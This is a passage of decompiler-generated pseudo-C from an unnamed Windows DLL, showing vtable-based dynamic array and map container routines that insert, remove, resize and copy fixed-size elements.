void __thiscall sub_10038185(_DWORD *this)
{
  sub_10032E71(this);
}

//----- (100381A7) --------------------------------------------------------
_BYTE *__usercall sub_100381A7@<eax>(int a1@<edi>, _BYTE *a2@<esi>)
{
  (*(void (__thiscall **)(_BYTE *, int))(*(_DWORD *)a2 + 56))(a2, a1);
  a2[16] = *(_BYTE *)(a1 + 16);
  a2[17] = *(_BYTE *)(a1 + 17);
  return a2;
}

//----- (100381BE) --------------------------------------------------------
void __thiscall sub_100381BE(_DWORD *this)
{
  *this = &off_101038D0;
  sub_100079EC((int)(this + 5));
  sub_100068A5(this + 1);
  sub_10039F05(this);
}
// 101038D0: using guessed type int (__thiscall *off_101038D0)(void *Block, char);

//----- (10038201) --------------------------------------------------------
int __thiscall sub_10038201(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = sub_1001901E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3), sub_1000D65C(a2, v4)) )
  {
    (*(void (__thiscall **)(_DWORD *, int, int))(this[1] + 32))(this + 1, a2, v3);
    a2 = 0;
    (*(void (__thiscall **)(_DWORD *, int *, int))(this[5] + 32))(this + 5, &a2, v3);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}

//----- (10038260) --------------------------------------------------------
_DWORD *__thiscall sub_10038260(_DWORD *this, _DWORD *a2)
{
  sub_1000809E(this + 1, a2);
  return a2;
}

//----- (10038291) --------------------------------------------------------
_DWORD *__thiscall sub_10038291(_DWORD *this, _DWORD *a2)
{
  sub_1000791E(this + 5, a2);
  return a2;
}

//----- (100382C2) --------------------------------------------------------
int *__thiscall sub_100382C2(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_1003916D(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (10038304) --------------------------------------------------------
void __thiscall sub_10038304(_DWORD *this)
{
  char *v2; // eax

  *this = &off_10103918;
  v2 = (char *)this[3];
  if ( v2 )
    sub_1003916D(v2);
  this[3] = 0;
  sub_10039F05(this);
}
// 10103918: using guessed type int (__thiscall *off_10103918)(void *Block, char);

//----- (10038356) --------------------------------------------------------
void __thiscall sub_10038356(_DWORD *this, int a2, unsigned int a3)
{
  unsigned int v4; // esi
  int v5; // edi
  int v6; // eax
  unsigned int v7; // eax
  int v8; // ecx
  _BYTE *v9; // esi
  _DWORD v10[4]; // [esp+10h] [ebp-24h] BYREF
  char v11; // [esp+20h] [ebp-14h]
  char v12; // [esp+21h] [ebp-13h]
  int v13; // [esp+24h] [ebp-10h]
  int v14; // [esp+30h] [ebp-4h]
  int v15; // [esp+3Ch] [ebp+8h]

  v4 = a3;
  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10134A67);
  sub_100391A7(a2, (int)v10);
  v14 = 0;
  v5 = *this;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  v7 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v7 > a3 )
  {
    v8 = 20 * v7;
    v15 = 20 * v7;
    v13 = v7 - a3;
    while ( 1 )
    {
      sub_100381A7(this[3] + v8 - 20, (_BYTE *)(this[3] + v8));
      v15 -= 20;
      if ( !--v13 )
        break;
      v8 = v15;
    }
    v4 = a3;
  }
  v9 = (_BYTE *)(this[3] + 20 * v4);
  (*(void (__thiscall **)(_BYTE *, _DWORD *))(*(_DWORD *)v9 + 56))(v9, v10);
  v9[16] = v11;
  v9[17] = v12;
  ++this[1];
  v14 = -1;
  sub_100380FA(v10);
}
// 10038356: using guessed type _DWORD var_24[4];

//----- (10038406) --------------------------------------------------------
int __thiscall sub_10038406(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  int v4; // ebp
  _BYTE *v5; // esi

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10134AAE);
  v3 = *this;
  --this[1];
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v4 = 20 * a2;
    do
    {
      sub_100381A7(this[3] + v4 + 20, (_BYTE *)(this[3] + v4));
      ++a2;
      v4 += 20;
    }
    while ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v5 = (_BYTE *)(this[3] + 20 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
  (*(void (__thiscall **)(_BYTE *, void *))(*(_DWORD *)v5 + 56))(v5, &unk_10193D20);
  v5[16] = byte_10193D30;
  v5[17] = byte_10193D31;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193D30: using guessed type char byte_10193D30;
// 10193D31: using guessed type char byte_10193D31;

//----- (1003848D) --------------------------------------------------------
int __thiscall sub_1003848D(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10134AAF);
  return this[3] + 20 * a2;
}

//----- (100384AC) --------------------------------------------------------
int __thiscall sub_100384AC(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10134AF6);
  return this[3] + 20 * a2;
}

//----- (100384CB) --------------------------------------------------------
char *__thiscall sub_100384CB(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_1003916D(v3);
  }
  return result;
}

//----- (100384F1) --------------------------------------------------------
int __thiscall sub_100384F1(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_1003916D(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10038518) --------------------------------------------------------
int __thiscall sub_10038518(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // ebx
  _BYTE *v5; // esi
  int v6; // eax
  unsigned int v8; // [esp+8h] [ebp-4h]

  v2 = a2;
  v8 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 20 * a2;
    do
    {
      v5 = (_BYTE *)(v4 + this[3]);
      (*(void (__thiscall **)(_BYTE *, void *))(*(_DWORD *)v5 + 56))(v5, &unk_10193D20);
      ++v8;
      v5[16] = byte_10193D30;
      v5[17] = byte_10193D31;
      v4 += 20;
    }
    while ( v8 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    v2 = a2;
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, v2);
  v6 = *this;
  this[1] = v2;
  return (*(int (__thiscall **)(_DWORD *))(v6 + 88))(this);
}
// 10193D30: using guessed type char byte_10193D30;
// 10193D31: using guessed type char byte_10193D31;

//----- (10038582) --------------------------------------------------------
unsigned int __thiscall sub_10038582(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10134AF7);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 20;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (100385FE) --------------------------------------------------------
unsigned int __stdcall sub_100385FE(unsigned int a1, unsigned int a2)
{
  unsigned int result; // eax

  for ( result = a1; result < a2; result *= 2 )
    ;
  return result;
}

//----- (1003860F) --------------------------------------------------------
unsigned int __thiscall sub_1003860F(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // esi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // edi
  int v10; // eax
  unsigned int result; // eax
  unsigned int v12; // [esp+24h] [ebp+8h]
  int v13; // [esp+2Ch] [ebp+10h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  v6 = (20 * (unsigned __int64)(unsigned int)v5) >> 32 != 0 ? -1 : 20 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      0x14u,
      v5,
      (void (__thiscall *)(void *))sub_10038185,
      (void (__thiscall *)(void *))sub_100380FA);
  }
  v12 = 0;
  this[1] = a2;
  v10 = *this;
  this[3] = v8;
  result = (*(int (__thiscall **)(_DWORD *))(v10 + 4))(this);
  if ( result )
  {
    v13 = 0;
    do
    {
      sub_100381A7(v13 + a3, (_BYTE *)(v13 + this[3]));
      ++v12;
      v13 += 20;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v12 < result );
  }
  return result;
}

//----- (100386C0) --------------------------------------------------------
void __thiscall sub_100386C0(_DWORD *this)
{
  int v2; // esi
  int v3; // eax
  int v4; // esi
  int v5; // eax
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // esi
  _BYTE *v9; // esi
  char *i; // eax
  char *v11; // [esp+14h] [ebp-1Ch]
  _BYTE *v12; // [esp+18h] [ebp-18h]
  unsigned int v13; // [esp+1Ch] [ebp-14h]
  int v14; // [esp+20h] [ebp-10h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v14 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v14 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v11 = (char *)this[3];
    v6 = (20 * (unsigned __int64)(unsigned int)v14) >> 32 != 0 ? -1 : 20 * v14;
    v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
    if ( v7 )
    {
      v8 = v7 + 1;
      *v7 = v14;
      `eh vector constructor iterator'(
        v7 + 1,
        0x14u,
        v14,
        (void (__thiscall *)(void *))sub_10038185,
        (void (__thiscall *)(void *))sub_100380FA);
      v12 = v8;
    }
    else
    {
      v12 = 0;
    }
    v13 = 0;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v9 = v12;
      for ( i = (char *)(v11 - v12); ; i = (char *)(v11 - v12) )
      {
        sub_100381A7((int)&v9[(_DWORD)i], v9);
        ++v13;
        v9 += 20;
        if ( v13 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
      }
    }
    this[3] = v12;
    if ( v11 )
      sub_1003916D(v11);
    this[2] = v14;
  }
}

//----- (100387C7) --------------------------------------------------------
void __thiscall sub_100387C7(_DWORD *this)
{
  *this = &off_10103894;
  sub_10038304(this + 5);
  sub_100068A5(this + 1);
  sub_10039F05(this);
}
// 10103894: using guessed type int (__thiscall *off_10103894)(void *Block, char);

//----- (1003880A) --------------------------------------------------------
int __thiscall sub_1003880A(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  int v5; // eax
  _DWORD v7[7]; // [esp+10h] [ebp-20h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]

  v3 = sub_1001901E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3), sub_1000D65C(a2, v4)) )
  {
    (*(void (__thiscall **)(_DWORD *, int, int))(this[1] + 32))(this + 1, a2, v3);
    sub_10038185(v7);
    v8 = 0;
    (*(void (__thiscall **)(_DWORD *, int, int))(this[5] + 32))(this + 5, v5, v3);
    v8 = -1;
    sub_100380FA(v7);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}
// 10038863: variable 'v5' is possibly undefined
// 1003880A: using guessed type _DWORD var_20[7];

//----- (10038883) --------------------------------------------------------
void __thiscall sub_10038883(void *this, int a2, int a3)
{
  _BYTE *v4; // esi
  _DWORD v5[4]; // [esp+10h] [ebp-20h] BYREF
  char v6; // [esp+20h] [ebp-10h]
  char v7; // [esp+21h] [ebp-Fh]
  int v8; // [esp+2Ch] [ebp-4h]

  sub_100391A7(a3, (int)v5);
  v8 = 0;
  v4 = (_BYTE *)(*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  (*(void (__thiscall **)(_BYTE *, _DWORD *))(*(_DWORD *)v4 + 56))(v4, v5);
  v4[16] = v6;
  v4[17] = v7;
  v8 = -1;
  sub_100380FA(v5);
}
// 10038883: using guessed type _DWORD var_20[4];

//----- (100388D8) --------------------------------------------------------
_DWORD *__thiscall sub_100388D8(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-28h]
  int v6; // [esp-4h] [ebp-24h]

  v2 = this + 5;
  *a2 = off_100FBF5C;
  *a2 = &off_10103918;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[5] + 4))(this + 5);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_1003860F(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103918: using guessed type int (__thiscall *off_10103918)(void *Block, char);

//----- (10038932) --------------------------------------------------------
void __thiscall sub_10038932(_DWORD *this)
{
  *this = &off_10103974;
  sub_100068A5(this + 5);
  sub_100068A5(this + 1);
  sub_10039F05(this);
}
// 10103974: using guessed type int (__thiscall *off_10103974)(void *Block, char);

//----- (10038975) --------------------------------------------------------
int __thiscall sub_10038975(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  _DWORD *v5; // eax
  int v7[4]; // [esp+10h] [ebp-14h] BYREF
  int v8; // [esp+20h] [ebp-4h]

  v3 = sub_1001901E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3), sub_1000D65C(a2, v4)) )
  {
    (*(void (__thiscall **)(_DWORD *, int, int))(this[1] + 32))(this + 1, a2, v3);
    v5 = sub_1000D17D(v7, &word_1017669C);
    v8 = 0;
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[5] + 32))(this + 5, v5, v3);
    v8 = -1;
    sub_1000D3AD(v7);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v3);
}

//----- (100389F4) --------------------------------------------------------
int __thiscall sub_100389F4(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  _DWORD *v6; // eax

  v3 = sub_1001901E(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3), sub_1000D65C(a2, v4)) )
  {
    v6 = sub_1000E8EF(&a2);
    sub_100078FE((int)v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v3);
}

//----- (10038A58) --------------------------------------------------------
void __thiscall sub_10038A58(_DWORD *this)
{
  *this = &off_101039B4;
  sub_1000E4EA((int)(this + 5));
  sub_1002DA13((int)(this + 1));
  sub_10039F05(this);
}
// 101039B4: using guessed type int (__thiscall *off_101039B4)(void *Block, char);

//----- (10038A9B) --------------------------------------------------------
bool __thiscall sub_10038A9B(_DWORD *this, _BYTE *a2)
{
  int v3; // edi

  v3 = sub_100313A7(this, a2);
  return v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
      && *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3) == *a2;
}

//----- (10038AD2) --------------------------------------------------------
char __thiscall sub_10038AD2(_DWORD *this, _BYTE *a2)
{
  int v3; // edi

  v3 = sub_100313A7(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    return 0;
  }
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (10038B1F) --------------------------------------------------------
int __thiscall sub_10038B1F(_DWORD *this, _BYTE *a2)
{
  _BYTE *v2; // edi
  int v4; // esi

  v2 = a2;
  v4 = sub_100313A7(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v4) != *v2 )
  {
    (*(void (__thiscall **)(_DWORD *, _BYTE *, int))(this[1] + 32))(this + 1, v2, v4);
    a2 = 0;
    (*(void (__thiscall **)(_DWORD *, _BYTE **, int))(this[5] + 32))(this + 5, &a2, v4);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v4);
}

//----- (10038B77) --------------------------------------------------------
_DWORD *__thiscall sub_10038B77(void *this, int a2, int *a3)
{
  int v3; // esi
  _DWORD *result; // eax

  v3 = *a3;
  result = (_DWORD *)(*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  *result = v3;
  return result;
}

//----- (10038B8D) --------------------------------------------------------
_DWORD *__thiscall sub_10038B8D(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-28h]
  int v6; // [esp-4h] [ebp-24h]

  v2 = this + 5;
  sub_1000E6CA(a2);
  *a2 = &off_10102398;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_1005753F(a2, v3, v5, v6);
  return a2;
}
// 10102398: using guessed type int (__thiscall *off_10102398)(void *Block, char);

//----- (10038BE3) --------------------------------------------------------
void __thiscall sub_10038BE3(_DWORD *this)
{
  *this = off_100FBF5C;
  *this = &off_101039F0;
  sub_10039581(this);
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 101039F0: using guessed type int (__thiscall *off_101039F0)(void *, char);

//----- (10038C18) --------------------------------------------------------
int *__thiscall sub_10038C18(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_1003922F(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (10038C5A) --------------------------------------------------------
void __thiscall sub_10038C5A(_DWORD *this)
{
  char *v2; // eax

  *this = &off_101039F0;
  v2 = (char *)this[3];
  if ( v2 )
    sub_1003922F(v2);
  this[3] = 0;
  sub_10039F05(this);
}
// 101039F0: using guessed type int (__thiscall *off_101039F0)(void *, char);

//----- (10038CAC) --------------------------------------------------------
void __thiscall sub_10038CAC(_DWORD *this, void *a2, unsigned int a3)
{
  int v4; // esi
  int v5; // eax
  unsigned int v6; // eax
  int v7; // ecx
  int v8; // [esp+14h] [ebp-60h]
  int v9; // [esp+18h] [ebp-5Ch]
  LONG v10[19]; // [esp+1Ch] [ebp-58h] BYREF
  int v11; // [esp+70h] [ebp-4h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10134EDE);
  sub_1003924D(a2, v10);
  v11 = 0;
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v6 > a3 )
  {
    v7 = 72 * v6;
    v8 = 72 * v6;
    v9 = v6 - a3;
    while ( 1 )
    {
      sub_10039380((LONG *)(this[3] + v7 - 72), (LONG *)(this[3] + v7));
      v8 -= 72;
      if ( !--v9 )
        break;
      v7 = v8;
    }
  }
  sub_10039380(v10, (LONG *)(this[3] + 72 * a3));
  ++this[1];
  v11 = -1;
  sub_100392FB(v10);
}
// 10038CAC: using guessed type LONG var_58[19];

//----- (10038D82) --------------------------------------------------------
int __thiscall sub_10038D82(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  int v4; // ebp
  int v5; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10134EDF);
  v3 = *this;
  --this[1];
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v4 = 72 * a2;
    do
    {
      sub_10039380((LONG *)(this[3] + v4 + 72), (LONG *)(this[3] + v4));
      ++a2;
      v4 += 72;
    }
    while ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_10039380(dword_10193CB8, (LONG *)(this[3] + 72 * v5));
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193CB8: using guessed type LONG dword_10193CB8[18];

//----- (10038DF7) --------------------------------------------------------
int __thiscall sub_10038DF7(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10134F1E);
  return this[3] + 72 * a2;
}

//----- (10038E16) --------------------------------------------------------
int __thiscall sub_10038E16(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10134F1F);
  return this[3] + 72 * a2;
}

//----- (10038E35) --------------------------------------------------------
char *__thiscall sub_10038E35(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_1003922F(v3);
  }
  return result;
}

//----- (10038E5B) --------------------------------------------------------
int __thiscall sub_10038E5B(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_1003922F(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10038E82) --------------------------------------------------------
int __thiscall sub_10038E82(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebp
  int v4; // ebp
  int v5; // eax
  unsigned int v7; // [esp+8h] [ebp-4h]

  v2 = a2;
  v7 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 72 * a2;
    do
    {
      sub_10039380(dword_10193CB8, (LONG *)(v4 + this[3]));
      ++v7;
      v4 += 72;
    }
    while ( v7 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    v2 = a2;
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, v2);
  v5 = *this;
  this[1] = v2;
  return (*(int (__thiscall **)(_DWORD *))(v5 + 88))(this);
}
// 10193CB8: using guessed type LONG dword_10193CB8[18];

//----- (10038EDE) --------------------------------------------------------
unsigned int __thiscall sub_10038EDE(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10135062);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 72;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (10038F5A) --------------------------------------------------------
unsigned int __thiscall sub_10038F5A(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // esi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // edi
  int v10; // eax
  unsigned int result; // eax
  unsigned int v12; // [esp+24h] [ebp+8h]
  int v13; // [esp+2Ch] [ebp+10h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  v6 = (72 * (unsigned __int64)(unsigned int)v5) >> 32 != 0 ? -1 : 72 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      0x48u,
      v5,
      (void (__thiscall *)(void *))sub_100393E6,
      (void (__thiscall *)(void *))sub_100392FB);
  }
  v12 = 0;
  this[1] = a2;
  v10 = *this;
  this[3] = v8;
  result = (*(int (__thiscall **)(_DWORD *))(v10 + 4))(this);
  if ( result )
  {
    v13 = 0;
    do
    {
      sub_10039380((LONG *)(v13 + a3), (LONG *)(v13 + this[3]));
      ++v12;
      v13 += 72;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v12 < result );
  }
  return result;
}

//----- (1003900B) --------------------------------------------------------
void __thiscall sub_1003900B(_DWORD *this)
{
  int v2; // esi
  int v3; // eax
  int v4; // esi
  int v5; // eax
  int v6; // ecx
  int *v7; // eax
  LONG *v8; // esi
  LONG *v9; // esi
  char *i; // eax
  char *v11; // [esp+14h] [ebp-1Ch]
  LONG *v12; // [esp+18h] [ebp-18h]
  unsigned int v13; // [esp+1Ch] [ebp-14h]
  int v14; // [esp+20h] [ebp-10h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v14 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v14 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v11 = (char *)this[3];
    v6 = (72 * (unsigned __int64)(unsigned int)v14) >> 32 != 0 ? -1 : 72 * v14;
    v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
    if ( v7 )
    {
      v8 = v7 + 1;
      *v7 = v14;
      `eh vector constructor iterator'(
        v7 + 1,
        0x48u,
        v14,
        (void (__thiscall *)(void *))sub_100393E6,
        (void (__thiscall *)(void *))sub_100392FB);
      v12 = v8;
    }
    else
    {
      v12 = 0;
    }
    v13 = 0;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v9 = v12;
      for ( i = (char *)(v11 - (char *)v12); ; i = (char *)(v11 - (char *)v12) )
      {
        sub_10039380((LONG *)((char *)v9 + (_DWORD)i), v9);
        ++v13;
        v9 += 18;
        if ( v13 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
      }
    }
    this[3] = v12;
    if ( v11 )
      sub_1003922F(v11);
    this[2] = v14;
  }
}

//----- (10039112) --------------------------------------------------------
_DWORD *__userpurge sub_10039112@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

